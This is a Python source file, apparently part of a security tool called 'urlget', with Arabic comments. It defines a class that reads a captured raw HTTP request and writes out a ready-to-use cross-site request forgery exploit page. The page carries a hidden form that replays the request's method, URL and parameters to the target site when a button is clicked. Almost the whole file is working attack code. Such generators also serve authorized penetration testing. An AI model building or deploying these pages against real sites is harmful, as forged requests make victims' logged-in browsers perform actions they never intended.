#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import json
import logging
import requests
from urllib.parse import urlparse
from colorama import Fore, Style

from urlget.utils import setup_logger

class CSRFGenerator:
    """فئة لإنشاء استغلالات CSRF"""
    
    def __init__(self, request_file=None, output_html=None, verbose=False):
        """تهيئة مولد CSRF"""
        self.request_file = request_file
        self.output_html = output_html
        self.verbose = verbose
        
        # إعداد السجل
        self.logger = setup_logger("CSRFGenerator", level=logging.DEBUG if verbose else logging.INFO)
        
        # بيانات الطلب
        self.request_data = None
    
    def load_request(self):
        """تحميل بيانات الطلب من ملف"""
        if not self.request_file or not os.path.exists(self.request_file):
            self.logger.error("ملف الطلب غير موجود")
            return False
        
        try:
            with open(self.request_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # تحليل الطلب
            request_lines = content.strip().split('\n')
            
            # استخراج طريقة HTTP والمسار والإصدار
            request_line = request_lines[0]
            method, path, version = request_line.split(' ')
            
            # استخراج الرؤوس
            headers = {}
            i = 1
            while i < len(request_lines) and request_lines[i]:
                header_line = request_lines[i]
                key, value = header_line.split(':', 1)
                headers[key.strip()] = value.strip()
                i += 1
            
            # استخراج الجسم
            body = ''
            if i < len(request_lines):
                body = '\n'.join(request_lines[i+1:])
            
            # استخراج المضيف من الرؤوس
            host = headers.get('Host', '')
            
            # إنشاء عنوان URL كامل
            url = f"http://{host}{path}" if not path.startswith('http') else path
            
            # تخزين بيانات الطلب
            self.request_data = {
                'method': method,
                'url': url,
                'headers': headers,
                'body': body
            }
            
            self.logger.info(f"تم تحميل الطلب: {method} {url}")
            return True
            
        except Exception as e:
            self.logger.error(f"فشل في تحليل ملف الطلب: {str(e)}")
            return False
    
    def parse_form_data(self):
        """تحليل بيانات النموذج من جسم الطلب"""
        if not self.request_data or not self.request_data['body']:
            return {}
        
        content_type = self.request_data['headers'].get('Content-Type', '')
        body = self.request_data['body']
        
        form_data = {}
        
        if 'application/x-www-form-urlencoded' in content_type:
            # تحليل بيانات النموذج المشفرة
            for param in body.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    form_data[key] = value
        
        elif 'application/json' in content_type:
            # تحليل بيانات JSON
            try:
                form_data = json.loads(body)
            except json.JSONDecodeError:
                self.logger.error("فشل في تحليل بيانات JSON")
        
        elif 'multipart/form-data' in content_type:
            # تحليل بيانات متعددة الأجزاء
            boundary = re.search(r'boundary=([^;]+)', content_type)
            if boundary:
                boundary_value = boundary.group(1)
                parts = body.split(f'--{boundary_value}')
                
                for part in parts:
                    if not part.strip():
                        continue
                    
                    # استخراج اسم الحقل
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        
                        # استخراج القيمة
                        lines = part.split('\n')
                        for i in range(len(lines)):
                            if not lines[i].strip() and i + 1 < len(lines):
                                value = lines[i+1].strip()
                                form_data[name] = value
                                break
        
        return form_data
    
    def generate_csrf_html(self):
        """إنشاء HTML لاستغلال CSRF"""
        if not self.request_data:
            self.logger.error("لم يتم تحميل بيانات الطلب")
            return None
        
        method = self.request_data['method']
        url = self.request_data['url']
        form_data = self.parse_form_data()
        
        # إنشاء HTML
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>استغلال CSRF</title>
    <meta charset="UTF-8">
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }}
        .container {{
            max-width: 800px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }}
        h1 {{
            color: #d9534f;
            text-align: center;
        }}
        .info {{
            background-color: #f9f9f9;
            padding: 10px;
            border-left: 4px solid #5bc0de;
            margin-bottom: 20px;
        }}
        button {{
            background-color: #d9534f;
            color: white;
            border: none;
            padding: 10px 15px;
            cursor: pointer;
            font-size: 16px;
            border-radius: 3px;
        }}
        button:hover {{
            background-color: #c9302c;
        }}
        .hidden {{
            display: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>استغلال CSRF</h1>
        <div class="info">
            <p><strong>الهدف:</strong> {url}</p>
            <p><strong>الطريقة:</strong> {method}</p>
            <p>انقر على الزر أدناه لإرسال الطلب المزيف.</p>
        </div>
        
        <button id="exploit">تشغيل الاستغلال</button>
        
        <div class="hidden">
            <form id="csrf-form" action="{url}" method="{method.lower()}">
"""
        
        # إضافة حقول النموذج
        for key, value in form_data.items():
            html += f'                <input type="hidden" name="{key}" value="{value}">\n'
        
        html += """            </form>
        </div>
        
        <script>
            document.getElementById('exploit').addEventListener('click', function() {
                document.getElementById('csrf-form').submit();
            });
        </script>
    </div>
</body>
</html>
"""
        
        return html
    
    def save_html(self, html_content):
        """حفظ محتوى HTML في ملف"""
        if not self.output_html:
            timestamp = self._get_timestamp()
            self.output_html = f"csrf_exploit_{timestamp}.html"
        
        try:
            with open(self.output_html, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.logger.info(f"تم حفظ استغلال CSRF في: {self.output_html}")
            return True
            
        except Exception as e:
            self.logger.error(f"فشل في حفظ ملف HTML: {str(e)}")
            return False
    
    def _get_timestamp(self):
        """الحصول على طابع زمني للملف"""
        from datetime import datetime
        return datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def generate(self):
        """إنشاء استغلال CSRF"""
        print(f"{Fore.GREEN}[+] بدء إنشاء استغلال CSRF...{Style.RESET_ALL}")
        
        # تحميل الطلب
        if not self.load_request():
            print(f"{Fore.RED}[!] فشل في تحميل ملف الطلب{Style.RESET_ALL}")
            return False
        
        # إنشاء HTML
        html_content = self.generate_csrf_html()
        if not html_content:
            print(f"{Fore.RED}[!] فشل في إنشاء HTML للاستغلال{Style.RESET_ALL}")
            return False
        
        # حفظ HTML
        if not self.save_html(html_content):
            print(f"{Fore.RED}[!] فشل في حفظ ملف HTML{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.GREEN}[+] تم إنشاء استغلال CSRF بنجاح!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] تم حفظ الاستغلال في: {self.output_html}{Style.RESET_ALL}")
        
        return True